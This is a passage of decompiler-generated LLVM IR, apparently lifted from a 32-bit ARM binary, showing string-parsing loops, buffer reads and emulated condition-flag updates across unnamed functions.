  br label %dec_label_pc_9254

dec_label_pc_9240:                                ; preds = %dec_label_pc_9254
  br i1 %v7_9244, label %dec_label_pc_9284, label %dec_label_pc_924c

dec_label_pc_924c:                                ; preds = %dec_label_pc_9240
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9254

dec_label_pc_9254:                                ; preds = %dec_label_pc_9214, %dec_label_pc_924c
  %v0_9254 = phi i32 [ %v0_9240, %dec_label_pc_924c ], [ %v0_9254.pre, %dec_label_pc_9214 ]
  %storemerge4 = phi i32 [ %v1_9268, %dec_label_pc_924c ], [ %storemerge4.pre, %dec_label_pc_9214 ]
  store i32 %storemerge4, i32* %stack_var_-40, align 4
  store i32 %v0_9254, i32* %r0.global-to-local, align 4
  %v1_9258 = inttoptr i32 %v0_9254 to i8*
  %v2_9258 = call i32 @function_12c94(i8* %v1_9258)
  store i32 %v2_9258, i32* %r0.global-to-local, align 4
  %v3_9260 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9260, i32* %r4.global-to-local, align 4
  %v2_9264 = sub i32 %v2_9258, %v3_9260
  %v3_9264 = icmp uge i32 %v2_9258, %v3_9260
  store i1 %v3_9264, i1* %cpsr_c.global-to-local, align 1
  %v4_9264 = xor i32 %v3_9260, %v2_9258
  %v5_9264 = xor i32 %v2_9264, %v2_9258
  %v6_9264 = and i32 %v5_9264, %v4_9264
  %v7_9264 = icmp slt i32 %v6_9264, 0
  store i1 %v7_9264, i1* %cpsr_v.global-to-local, align 1
  %v8_9264 = icmp slt i32 %v2_9264, 0
  store i1 %v8_9264, i1* %cpsr_n.global-to-local, align 1
  %v9_9264 = icmp eq i32 %v2_9258, %v3_9260
  store i1 %v9_9264, i1* %cpsr_z.global-to-local, align 1
  %v1_9268 = add i32 %v3_9260, 1
  store i32 %v1_9268, i32* %ip.global-to-local, align 4
  %v8_926c = icmp sgt i32 %v2_9258, %v3_9260
  %v0_9240 = load i32, i32* @r5, align 4
  %v2_9240 = add i32 %v0_9240, %v3_9260
  %v3_9240 = inttoptr i32 %v2_9240 to i8*
  %v4_9240 = load i8, i8* %v3_9240, align 1
  %v6_9240 = zext i8 %v4_9240 to i32
  store i32 %v6_9240, i32* %r3.global-to-local, align 4
  %v2_9244 = icmp ugt i8 %v4_9240, 60
  store i1 %v2_9244, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9244 = icmp ult i8 %v4_9240, 61
  store i1 %v6_9244, i1* %cpsr_n.global-to-local, align 1
  %v7_9244 = icmp eq i8 %v4_9240, 61
  store i1 %v7_9244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_926c, label %dec_label_pc_9240, label %dec_label_pc_9270

dec_label_pc_9270:                                ; preds = %dec_label_pc_9254
  br i1 %v7_9244, label %dec_label_pc_9284, label %dec_label_pc_927c

dec_label_pc_927c:                                ; preds = %dec_label_pc_92c8, %dec_label_pc_92ec, %dec_label_pc_9270, %bb224
  %v0_927c = load i32, i32* @sl, align 4
  store i32 %v0_927c, i32* @r5, align 4
  br label %dec_label_pc_9128

dec_label_pc_9284:                                ; preds = %dec_label_pc_9240, %dec_label_pc_9270
  %v0_9284 = load i32, i32* @r8, align 4
  %v1_9284 = add i32 %v0_9284, 12
  %v2_9284 = inttoptr i32 %v1_9284 to i32*
  %v3_9284 = load i32, i32* %v2_9284, align 4
  store i32 %v3_9284, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9290 = icmp slt i32 %v3_9284, 0
  store i1 %v1_9290, i1* %cpsr_n.global-to-local, align 1
  %v2_9290 = icmp eq i32 %v3_9284, 0
  store i1 %v2_9290, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp228 = icmp slt i32 %v3_9284, 1
  br i1 %tmp228, label %dec_label_pc_92ec, label %dec_label_pc_929c

dec_label_pc_929c:                                ; preds = %dec_label_pc_9284
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_92c8

dec_label_pc_92a4:                                ; preds = %dec_label_pc_92c8
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_92a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_92a8, i32* %r3.global-to-local, align 4
  %v0_92ac = load i32, i32* @r8, align 4
  %v1_92ac = add i32 %v0_92ac, 12
  %v2_92ac = inttoptr i32 %v1_92ac to i32*
  %v3_92ac = load i32, i32* %v2_92ac, align 4
  %v1_92b0 = add i32 %v3_92a8, 1
  store i32 %v1_92b0, i32* %ip.global-to-local, align 4
  %v2_92b4 = sub i32 %v3_92ac, %v1_92b0
  %v3_92b4 = icmp uge i32 %v3_92ac, %v1_92b0
  store i1 %v3_92b4, i1* %cpsr_c.global-to-local, align 1
  %v4_92b4 = xor i32 %v3_92ac, %v1_92b0
  %v5_92b4 = xor i32 %v2_92b4, %v3_92ac
  %v6_92b4 = and i32 %v5_92b4, %v4_92b4
  %v7_92b4 = icmp slt i32 %v6_92b4, 0
  store i1 %v7_92b4, i1* %cpsr_v.global-to-local, align 1
  %v8_92b4 = icmp slt i32 %v2_92b4, 0
  store i1 %v8_92b4, i1* %cpsr_n.global-to-local, align 1
  %v9_92b4 = icmp eq i32 %v3_92ac, %v1_92b0
  store i1 %v9_92b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v1_92b0, i32* %r1.global-to-local, align 4
  store i32 %v1_92b0, i32* %stack_var_-40, align 4
  %v7_92c4 = icmp sgt i32 %v3_92ac, %v1_92b0
  %v0_92d4.pre = load i32, i32* @r5, align 4
  br i1 %v7_92c4, label %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge, label %dec_label_pc_92ec

dec_label_pc_92a4.dec_label_pc_92c8_crit_edge:    ; preds = %dec_label_pc_92a4
  %v0_92d8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_92c8

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge, %dec_label_pc_929c
  %v0_92d8 = phi i32 [ %v0_92d8.pre, %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge ], [ %v3_9260, %dec_label_pc_929c ]
  %v0_92d4 = phi i32 [ %v0_92d4.pre, %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge ], [ %v0_9240, %dec_label_pc_929c ]
  %v0_92c8 = phi i32 [ %v1_92b0, %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge ], [ 0, %dec_label_pc_929c ]
  %v1_92c8 = and i32 %v0_92c8, 33554432
  %v2_92c8 = icmp ne i32 %v1_92c8, 0
  store i1 %v2_92c8, i1* %cpsr_c.global-to-local, align 1
  %v3_92c8 = mul i32 %v0_92c8, 128
  %v1_92cc = add i32 %v3_92c8, 1472
  %v0_92d0 = load i32, i32* %sb.global-to-local, align 4
  %v2_92d0 = add i32 %v1_92cc, %v0_92d0
  store i32 %v2_92d0, i32* %r1.global-to-local, align 4
  store i32 %v0_92d4, i32* %r0.global-to-local, align 4
  store i32 %v0_92d8, i32* %r2.global-to-local, align 4
  %v3_92dc = inttoptr i32 %v0_92d4 to i8*
  %v4_92dc = call i32 @function_130f8(i8* %v3_92dc, i32 %v2_92d0, i32 %v0_92d8)
  store i32 %v4_92dc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_92e0 = icmp slt i32 %v4_92dc, 0
  store i1 %v1_92e0, i1* %cpsr_n.global-to-local, align 1
  %v2_92e0 = icmp eq i32 %v4_92dc, 0
  store i1 %v2_92e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_92e0, label %dec_label_pc_92a4, label %dec_label_pc_927c

dec_label_pc_92ec:                                ; preds = %dec_label_pc_92a4, %dec_label_pc_9284
  %v0_92ec = phi i32 [ %v0_9240, %dec_label_pc_9284 ], [ %v0_92d4.pre, %dec_label_pc_92a4 ]
  store i32 %v0_92ec, i32* %r0.global-to-local, align 4
  %v1_92f0 = inttoptr i32 %v0_92ec to i8*
  %v2_92f0 = call i32 @function_12c94(i8* %v1_92f0)
  store i32 %v2_92f0, i32* %r0.global-to-local, align 4
  %v1_92f4 = add i32 %v2_92f0, -127
  %v2_92f4 = icmp ugt i32 %v2_92f0, 126
  store i1 %v2_92f4, i1* %cpsr_c.global-to-local, align 1
  %v3_92f4 = sub i32 126, %v2_92f0
  %v4_92f4 = and i32 %v3_92f4, %v2_92f0
  %v5_92f4 = icmp slt i32 %v4_92f4, 0
  store i1 %v5_92f4, i1* %cpsr_v.global-to-local, align 1
  %v6_92f4 = icmp slt i32 %v1_92f4, 0
  store i1 %v6_92f4, i1* %cpsr_n.global-to-local, align 1
  %v7_92f4 = icmp eq i32 %v2_92f0, 127
  store i1 %v7_92f4, i1* %cpsr_z.global-to-local, align 1
  %v8_92f8 = icmp sgt i32 %v2_92f0, 127
  br i1 %v8_92f8, label %dec_label_pc_927c, label %dec_label_pc_92fc

dec_label_pc_92fc:                                ; preds = %dec_label_pc_92ec
  %v0_92fc = load i32, i32* @r8, align 4
  %v1_92fc = add i32 %v0_92fc, 12
  %v2_92fc = inttoptr i32 %v1_92fc to i32*
  %v3_92fc = load i32, i32* %v2_92fc, align 4
  %v1_9300 = and i32 %v3_92fc, 33554432
  %v2_9300 = icmp ne i32 %v1_9300, 0
  store i1 %v2_9300, i1* %cpsr_c.global-to-local, align 1
  %v3_9300 = mul i32 %v3_92fc, 128
  %v1_9304 = add i32 %v3_9300, 1472
  %v0_9308 = load i32, i32* @r5, align 4
  store i32 %v0_9308, i32* %r1.global-to-local, align 4
  %v0_930c = load i32, i32* %sb.global-to-local, align 4
  %v2_930c = add i32 %v1_9304, %v0_930c
  store i32 %v2_930c, i32* @r0, align 4
  %v2_9310 = inttoptr i32 %v2_930c to i8*
  %v3_9310 = call i32 @function_12cbc(i8* %v2_9310, i32 %v0_9308)
  store i32 %v3_9310, i32* %r0.global-to-local, align 4
  %v0_9314 = load i32, i32* @r8, align 4
  %v1_9314 = add i32 %v0_9314, 12
  %v2_9314 = inttoptr i32 %v1_9314 to i32*
  %v3_9314 = load i32, i32* %v2_9314, align 4
  %v0_9318 = load i32, i32* @sl, align 4
  store i32 %v0_9318, i32* @r5, align 4
  %v1_931c = add i32 %v3_9314, 1
  store i32 %v1_931c, i32* %r3.global-to-local, align 4
  store i32 %v1_931c, i32* %v2_9314, align 4
  %v1_9134.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9128

dec_label_pc_9328:                                ; preds = %dec_label_pc_915c, %dec_label_pc_9128
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_9330 = call i32 @function_12288(i32 38, i32* null)
  %v0_9334 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9334, i32* @r1, align 4
  store i32 %v3_9330, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_9340 = call i32 @function_12fe8(i8* %tmp199, i32 %v0_9334, i32 %v3_9330)
  store i32 %v4_9340, i32* %r0.global-to-local, align 4
  %v1_9344 = add i32 %v4_9340, 1
  %v2_9344 = icmp eq i32 %v4_9340, -1
  store i1 %v2_9344, i1* %cpsr_c.global-to-local, align 1
  %v3_9344 = sub i32 0, %v4_9340
  %v4_9344 = and i32 %v1_9344, %v3_9344
  %v5_9344 = icmp slt i32 %v4_9344, 0
  store i1 %v5_9344, i1* %cpsr_v.global-to-local, align 1
  %v6_9344 = icmp slt i32 %v1_9344, 0
  store i1 %v6_9344, i1* %cpsr_n.global-to-local, align 1
  %v7_9344 = icmp eq i32 %v1_9344, 0
  store i1 %v7_9344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9344, label %dec_label_pc_9678, label %dec_label_pc_934c

dec_label_pc_934c:                                ; preds = %dec_label_pc_9328
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_9354 = call i32 @function_12288(i32 38, i32* null)
  %v0_9358 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9358, i32* @r1, align 4
  store i32 %v3_9354, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_9364 = call i32 @function_12fe8(i8* %tmp199, i32 %v0_9358, i32 %v3_9354)
  store i32 %v4_9364, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v2_9370 = add i32 %v4_9364, %v2_8748
  store i32 %v2_9370, i32* %r3.global-to-local, align 4
  %v1_9374 = load i32, i32* @r6, align 4
  %v2_9374 = add i32 %v1_9374, %v2_9370
  %v3_9374 = inttoptr i32 %v2_9374 to i8*
  %v4_9374 = load i8, i8* %v3_9374, align 1
  store i32 %v2_8280, i32* %lr.global-to-local, align 4
  %v2_937c = icmp ugt i8 %v4_9374, 31
  store i1 %v2_937c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_937c = icmp ult i8 %v4_9374, 32
  store i1 %v6_937c, i1* %cpsr_n.global-to-local, align 1
  %v7_937c = icmp eq i8 %v4_9374, 32
  store i1 %v7_937c, i1* %cpsr_z.global-to-local, align 1
  %v2_9384 = zext i1 %v7_937c to i32
  %v2_9384.v4_9364 = add i32 %v2_9384, %v4_9364
  store i32 %v2_9384.v4_9364, i32* @r4, align 4
  %v2_9388 = add i32 %v2_9384.v4_9364, %v2_8280
  store i32 %v2_9388, i32* @r5, align 4
  store i32 %v2_9388, i32* %r0.global-to-local, align 4
  %v1_9390 = load i32, i32* %fp.global-to-local, align 4
  %v2_9390 = sub i32 %v1_9390, %v2_9384.v4_9364
  store i32 %v2_9390, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_939c = call i32 @function_12d58(i32 %v2_9388, i32 %v2_9390, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32 2)
  store i32 %v5_939c, i32* %r0.global-to-local, align 4
  %v1_93a0 = add i32 %v5_939c, 1
  %v2_93a0 = icmp eq i32 %v5_939c, -1
  store i1 %v2_93a0, i1* %cpsr_c.global-to-local, align 1
  %v3_93a0 = sub i32 0, %v5_939c
  %v4_93a0 = and i32 %v1_93a0, %v3_93a0
  %v5_93a0 = icmp slt i32 %v4_93a0, 0
  store i1 %v5_93a0, i1* %cpsr_v.global-to-local, align 1
  %v6_93a0 = icmp slt i32 %v1_93a0, 0
  store i1 %v6_93a0, i1* %cpsr_n.global-to-local, align 1
  %v7_93a0 = icmp eq i32 %v1_93a0, 0
  store i1 %v7_93a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_939c, i32* %lr.global-to-local, align 4
  br i1 %v7_93a0, label %dec_label_pc_9678, label %dec_label_pc_93ac

dec_label_pc_93ac:                                ; preds = %dec_label_pc_934c
  store i32 %v2_8748, i32* %r1.global-to-local, align 4
  %v1_93b4 = add i32 %v5_939c, -1
  %v2_93b4 = icmp ne i32 %v5_939c, 0
  store i1 %v2_93b4, i1* %cpsr_c.global-to-local, align 1
  %v3_93b4 = sub i32 0, %v5_939c
  %v4_93b4 = and i32 %v5_939c, %v3_93b4
  %v5_93b4 = icmp slt i32 %v4_93b4, 0
  store i1 %v5_93b4, i1* %cpsr_v.global-to-local, align 1
  %v6_93b4 = icmp slt i32 %v1_93b4, 0
  store i1 %v6_93b4, i1* %cpsr_n.global-to-local, align 1
  %v7_93b4 = icmp eq i32 %v5_939c, 1
  store i1 %v7_93b4, i1* %cpsr_z.global-to-local, align 1
  %v1_93b8 = load i32, i32* @r4, align 4
  %v2_93b8 = add i32 %v1_93b8, %v2_8748
  store i32 %v2_93b8, i32* %ip.global-to-local, align 4
  %v7_93bc = icmp sgt i32 %v5_939c, 1
  br i1 %v7_93bc, label %bb229, label %bb230

bb229:                                            ; preds = %dec_label_pc_93ac
  %v9_93bc = add i32 %v5_939c, -2
  store i32 %v9_93bc, i32* %lr.global-to-local, align 4
  br label %bb230

bb230:                                            ; preds = %dec_label_pc_93ac, %bb229
  %v3_93e0 = phi i32 [ %v5_939c, %dec_label_pc_93ac ], [ %v9_93bc, %bb229 ]
  %v1_93c4 = add i32 %v3_93e0, 1
  store i32 %v1_93c4, i32* %r6.global-to-local, align 4
  %v1_93c8 = add i32 %v2_93b8, -20773
  store i32 %v1_93c8, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_93d0 = load i32, i32* @r5, align 4
  store i32 %v0_93d0, i32* %r0.global-to-local, align 4
  store i32 %v1_93c4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15f40.44 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_93e0 = add i32 %v3_93e0, %v1_93c8
  %v5_93e0 = inttoptr i32 %v4_93e0 to i8*
  store i8 0, i8* %v5_93e0, align 1
  %v5_93e4 = call i32 @function_12d58(i32 %v0_93d0, i32 %v1_93c4, i32 ptrtoint ([5 x i8]* @global_var_15f40.44 to i32), i32 4)
  store i32 %v5_93e4, i32* %r0.global-to-local, align 4
  %v1_93e8 = add i32 %v5_93e4, -4
  %v2_93e8 = icmp ugt i32 %v5_93e4, 3
  store i1 %v2_93e8, i1* %cpsr_c.global-to-local, align 1
  %v3_93e8 = sub i32 3, %v5_93e4
  %v4_93e8 = and i32 %v3_93e8, %v5_93e4
  %v5_93e8 = icmp slt i32 %v4_93e8, 0
  store i1 %v5_93e8, i1* %cpsr_v.global-to-local, align 1
  %v6_93e8 = icmp slt i32 %v1_93e8, 0
  store i1 %v6_93e8, i1* %cpsr_n.global-to-local, align 1
  %v7_93e8 = icmp eq i32 %v5_93e4, 4
  store i1 %v7_93e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93e8, label %dec_label_pc_9960, label %dec_label_pc_93f0

dec_label_pc_93f0:                                ; preds = %bb230
  store i32 %v2_8280, i32* %ip.global-to-local, align 4
  %v1_93f4 = load i32, i32* @r4, align 4
  %v2_93f4 = add i32 %v1_93f4, %v2_8280
  %v3_93f4 = inttoptr i32 %v2_93f4 to i8*
  %v4_93f4 = load i8, i8* %v3_93f4, align 1
  %v6_93f4 = zext i8 %v4_93f4 to i32
  store i32 %v6_93f4, i32* %r3.global-to-local, align 4
  %v2_93f8 = icmp ugt i8 %v4_93f4, 46
  store i1 %v2_93f8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_93f8 = icmp ult i8 %v4_93f4, 47
  store i1 %v6_93f8, i1* %cpsr_n.global-to-local, align 1
  %v7_93f8 = icmp eq i8 %v4_93f4, 47
  store i1 %v7_93f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93f8, label %dec_label_pc_9b54, label %dec_label_pc_9400

dec_label_pc_9400:                                ; preds = %dec_label_pc_94ac, %dec_label_pc_9a98, %dec_label_pc_9b84, %dec_label_pc_9b54, %dec_label_pc_9a30, %dec_label_pc_9a14, %dec_label_pc_93f0, %dec_label_pc_9ba0, %dec_label_pc_9a60
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9404 = load i32, i32* @r8, align 4
  %v3_9404 = add i32 %v2_9404, -1452
  %v4_9404 = inttoptr i32 %v3_9404 to i8*
  store i8 1, i8* %v4_9404, align 1
  br label %dec_label_pc_8838

dec_label_pc_940c:                                ; preds = %dec_label_pc_8828
  %v0_940c = call i32 @function_13c28()
  store i32 %v0_940c, i32* %r0.global-to-local, align 4
  %v0_9410 = load i32, i32* %sb.global-to-local, align 4
  %v1_9410 = add i32 %v0_9410, 1472
  store i32 %v1_9410, i32* %r3.global-to-local, align 4
  %v0_9418 = load i32, i32* @r8, align 4
  %v1_9418 = add i32 %v0_9418, 656
  %v2_9418 = inttoptr i32 %v1_9418 to i32*
  %v3_9418 = load i32, i32* %v2_9418, align 4
  store i32 %v3_9418, i32* %r3.global-to-local, align 4
  %v1_9420 = add i32 %v3_9418, -1024
  %v2_9420 = icmp ugt i32 %v3_9418, 1023
  store i1 %v2_9420, i1* %cpsr_c.global-to-local, align 1
  %v3_9420 = sub i32 1023, %v3_9418
  %v4_9420 = and i32 %v3_9420, %v3_9418
  %v5_9420 = icmp slt i32 %v4_9420, 0
  store i1 %v5_9420, i1* %cpsr_v.global-to-local, align 1
  %v6_9420 = icmp slt i32 %v1_9420, 0
  store i1 %v6_9420, i1* %cpsr_n.global-to-local, align 1
  %v7_9420 = icmp eq i32 %v3_9418, 1024
  store i1 %v7_9420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_940c, i32* %fp.global-to-local, align 4
  %v1_9428 = add i32 %v0_9410, 2116
  store i32 %v1_9428, i32* @r7, align 4
  br i1 %v7_9420, label %dec_label_pc_9528, label %dec_label_pc_9430

dec_label_pc_9430:                                ; preds = %dec_label_pc_940c, %dec_label_pc_9528, %dec_label_pc_951c
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_9434 = load i32, i32* %fp.global-to-local, align 4
  %v2_9434 = inttoptr i32 %v1_9434 to i32*
  store i32 0, i32* %v2_9434, align 4
  %v0_9438 = load i32, i32* @r8, align 4
  %v1_9438 = add i32 %v0_9438, 656
  %v2_9438 = inttoptr i32 %v1_9438 to i32*
  %v3_9438 = load i32, i32* %v2_9438, align 4
  store i32 %v3_9438, i32* %r1.global-to-local, align 4
  %v1_943c = add i32 %v0_9438, -1456
  %v2_943c = inttoptr i32 %v1_943c to i32*
  %v3_943c = load i32, i32* %v2_943c, align 4
  store i32 %v3_943c, i32* %r0.global-to-local, align 4
  %v1_9440 = sub i32 1024, %v3_9438
  store i32 %v1_9440, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9448 = load i32, i32* @r7, align 4
  %v2_9448 = add i32 %v0_9448, %v3_9438
  store i32 %v2_9448, i32* %r1.global-to-local, align 4
  %v4_944c = inttoptr i32 %v2_9448 to i32*
  %v5_944c = call i32 @function_13e60(i32 %v3_943c, i32* %v4_944c, i32 %v1_9440, i32 16384)
  store i32 %v5_944c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9450 = icmp slt i32 %v5_944c, 0
  store i1 %v1_9450, i1* %cpsr_n.global-to-local, align 1
  %v2_9450 = icmp eq i32 %v5_944c, 0
  store i1 %v2_9450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9450, label %dec_label_pc_992c, label %dec_label_pc_9458

dec_label_pc_9458:                                ; preds = %dec_label_pc_9430
  %v1_9458 = add i32 %v5_944c, 1
  %v2_9458 = icmp eq i32 %v5_944c, -1
  store i1 %v2_9458, i1* %cpsr_c.global-to-local, align 1
  %v3_9458 = sub i32 0, %v5_944c
  %v4_9458 = and i32 %v1_9458, %v3_9458
  %v5_9458 = icmp slt i32 %v4_9458, 0
  store i1 %v5_9458, i1* %cpsr_v.global-to-local, align 1
  %v6_9458 = icmp slt i32 %v1_9458, 0
  store i1 %v6_9458, i1* %cpsr_n.global-to-local, align 1
  %v7_9458 = icmp eq i32 %v1_9458, 0
  store i1 %v7_9458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9458, label %dec_label_pc_9950, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_9458
  %v0_9460 = load i32, i32* @r8, align 4
  %v1_9460 = add i32 %v0_9460, 656
  %v2_9460 = inttoptr i32 %v1_9460 to i32*
  %v3_9460 = load i32, i32* %v2_9460, align 4
  store i32 %v2_87d8, i32* %r1.global-to-local, align 4
  %v2_9468 = add i32 %v3_9460, %v5_944c
  store i32 %v2_9468, i32* @r4, align 4
  store i32 %v2_9468, i32* %v2_9460, align 4
  %v0_9470 = load i32, i32* %r1.global-to-local, align 4
  %v1_9470 = load i32, i32* @r8, align 4
  %v2_9470 = add i32 %v1_9470, -1448
  %v3_9470 = inttoptr i32 %v2_9470 to i32*
  store i32 %v0_9470, i32* %v3_9470, align 4
  br label %dec_label_pc_94fc

dec_label_pc_9478:                                ; preds = %dec_label_pc_94fc
  %v1_9478 = add i32 %v0_94fc, -4
  %v2_9478 = inttoptr i32 %v1_9478 to i32*
  %v3_9478 = load i32, i32* %v2_9478, align 4
  store i32 %v3_9478, i32* @sl, align 4
  %v1_947c = load i32, i32* @r4, align 4
  %v5_9480 = icmp slt i32 %v3_94fc, %v1_947c
  %storemerge73 = select i1 %v5_9480, i32 %v3_94fc, i32 %v1_947c
  store i32 %storemerge73, i32* @r5, align 4
  %v2_9488 = sub i32 %v3_94fc, %storemerge73
  store i32 %v2_9488, i32* @r6, align 4
  %v1_948c = add i32 %v3_9478, -1
  %v2_948c = icmp ne i32 %v3_9478, 0
  store i1 %v2_948c, i1* %cpsr_c.global-to-local, align 1
  %v3_948c = sub i32 0, %v3_9478
  %v4_948c = and i32 %v3_9478, %v3_948c
  %v5_948c = icmp slt i32 %v4_948c, 0
  store i1 %v5_948c, i1* %cpsr_v.global-to-local, align 1
  %v6_948c = icmp slt i32 %v1_948c, 0
  store i1 %v6_948c, i1* %cpsr_n.global-to-local, align 1
  %v7_948c = icmp eq i32 %v3_9478, 1
  store i1 %v7_948c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9488, i32* %v2_94fc, align 4
  br i1 %v7_948c, label %dec_label_pc_9548, label %dec_label_pc_9478.dec_label_pc_9498thread-pre-split_crit_edge

dec_label_pc_9478.dec_label_pc_9498thread-pre-split_crit_edge: ; preds = %dec_label_pc_9478
  %v0_9498.pr.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_9498

dec_label_pc_9498:                                ; preds = %dec_label_pc_9508, %dec_label_pc_9478.dec_label_pc_9498thread-pre-split_crit_edge, %dec_label_pc_9570
  %v0_9498 = phi i32 [ %v3_9570, %dec_label_pc_9570 ], [ %v0_9498.pr.pre, %dec_label_pc_9478.dec_label_pc_9498thread-pre-split_crit_edge ], [ %v3_94fc, %dec_label_pc_9508 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9498 = icmp slt i32 %v0_9498, 0
  store i1 %v1_9498, i1* %cpsr_n.global-to-local, align 1
  %v2_9498 = icmp eq i32 %v0_9498, 0
  store i1 %v2_9498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9498, label %dec_label_pc_94a0, label %dec_label_pc_94c0

dec_label_pc_94a0:                                ; preds = %dec_label_pc_9498
  %v0_94a0 = load i32, i32* @r8, align 4
  %v1_94a0 = add i32 %v0_94a0, 4
  %v2_94a0 = inttoptr i32 %v1_94a0 to i32*
  %v3_94a0 = load i32, i32* %v2_94a0, align 4
  store i32 %v3_94a0, i32* @r4, align 4
  %v1_94a4 = add i32 %v3_94a0, -1
  %v2_94a4 = icmp ne i32 %v3_94a0, 0
  store i1 %v2_94a4, i1* %cpsr_c.global-to-local, align 1
  %v3_94a4 = sub i32 0, %v3_94a0
  %v4_94a4 = and i32 %v3_94a0, %v3_94a4
  %v5_94a4 = icmp slt i32 %v4_94a4, 0
  store i1 %v5_94a4, i1* %cpsr_v.global-to-local, align 1
  %v6_94a4 = icmp slt i32 %v1_94a4, 0
  store i1 %v6_94a4, i1* %cpsr_n.global-to-local, align 1
  %v7_94a4 = icmp eq i32 %v3_94a0, 1
  store i1 %v7_94a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_94a4, label %dec_label_pc_9578, label %dec_label_pc_94ac

dec_label_pc_94ac:                                ; preds = %dec_label_pc_94a0
  %v1_94ac = add i32 %v0_94a0, 656
  %v2_94ac = inttoptr i32 %v1_94ac to i32*
  %v3_94ac = load i32, i32* %v2_94ac, align 4
  %v0_94b0 = load i32, i32* @r5, align 4
  %v2_94b0 = sub i32 %v3_94ac, %v0_94b0
  store i32 %v2_94b0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_94b4 = icmp slt i32 %v2_94b0, 0
  store i1 %v1_94b4, i1* %cpsr_n.global-to-local, align 1
  %v2_94b4 = icmp eq i32 %v2_94b0, 0
  store i1 %v2_94b4, i1* %cpsr_z.global-to-local, align 1
  %v2_94b8 = add i32 %v0_94a0, 8
  %v3_94b8 = inttoptr i32 %v2_94b8 to i32*
  store i32 %v2_94b0, i32* %v3_94b8, align 4
  br i1 %v2_94b4, label %dec_label_pc_9400, label %dec_label_pc_94c0

dec_label_pc_94c0:                                ; preds = %dec_label_pc_9498, %dec_label_pc_94ac, %dec_label_pc_9578, %dec_label_pc_9600
  %v0_94c0 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_94c0 = icmp slt i32 %v0_94c0, 0
  store i1 %v1_94c0, i1* %cpsr_n.global-to-local, align 1
  %v2_94c0 = icmp eq i32 %v0_94c0, 0
  store i1 %v2_94c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_94c0, label %dec_label_pc_9510, label %dec_label_pc_94c8

dec_label_pc_94c8:                                ; preds = %dec_label_pc_94c0
  %v0_94c8 = load i32, i32* @r8, align 4
